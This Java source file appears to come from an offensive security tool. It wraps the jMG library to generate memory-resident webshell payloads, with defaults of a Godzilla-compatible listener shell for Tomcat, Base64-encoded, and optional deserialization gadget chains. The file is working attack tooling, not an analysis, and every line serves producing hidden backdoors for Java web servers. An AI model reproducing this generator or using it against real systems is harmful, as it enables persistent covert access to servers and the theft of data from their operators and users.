package com.summersec.attack.integration.generator;

import com.summersec.attack.integration.generator.model.MemshellGenerateRequest;
import com.summersec.attack.integration.generator.model.MemshellGenerateResult;

public class JmgMemshellGeneratorAdapter implements MemshellGeneratorAdapter {
    @Override
    public MemshellGenerateResult generate(MemshellGenerateRequest request) {
        try {
            Class<?> constantsClass = resolveClass(
                "jmg.core.config.Constants",
                "jmg.sdk.config.Constants"
            );
            Class<?> configClass = resolveClass(
                "jmg.core.config.AbstractConfig",
                "jmg.sdk.config.AbstractConfig"
            );
            Class<?> generatorClass = resolveClass(
                "jmg.core.jMGenerator",
                "jmg.sdk.jMGenerator"
            );

            Object config = configClass.newInstance();
            invokeSetter(configClass, config, "setToolType", constantsClass, valueOrDefault(request.getToolType(), "TOOL_GODZILLA"));
            invokeSetter(configClass, config, "setServerType", constantsClass, valueOrDefault(request.getServerType(), "SERVER_TOMCAT"));
            invokeSetter(configClass, config, "setShellType", constantsClass, valueOrDefault(request.getShellType(), "SHELL_LISTENER"));
            invokeSetter(configClass, config, "setOutputFormat", constantsClass, valueOrDefault(request.getFormatType(), "FORMAT_BASE64"));
            invokeSetter(configClass, config, "setGadgetType", constantsClass, valueOrDefault(request.getGadgetType(), "GADGET_NONE"));
            configClass.getMethod("build").invoke(config);

            Object generator = generatorClass.getConstructor(configClass).newInstance(config);
            generatorClass.getMethod("genPayload").invoke(generator);
            Object payload = generatorClass.getMethod("getPayload").invoke(generator);
            return MemshellGenerateResult.ok("jMG", String.valueOf(payload), "", "");
        } catch (Exception e) {
            return MemshellGenerateResult.fail("jMG", e.getMessage());
        }
    }

    private static Class<?> resolveClass(String... names) throws ClassNotFoundException {
        for (String name : names) {
            try {
                return Class.forName(name);
            } catch (ClassNotFoundException ignored) {
            }
        }
        throw new ClassNotFoundException("无法定位 jMG API 类");
    }

    private static String valueOrDefault(String value, String fallback) {
        return value == null || value.trim().isEmpty() ? fallback : value.trim();
    }

    private static void invokeSetter(Class<?> configClass, Object config, String methodName, Class<?> constantsClass, String fieldName) throws Exception {
        String constantValue = String.valueOf(constantsClass.getField(fieldName).get(null));
        configClass.getMethod(methodName, String.class).invoke(config, constantValue);
    }
}
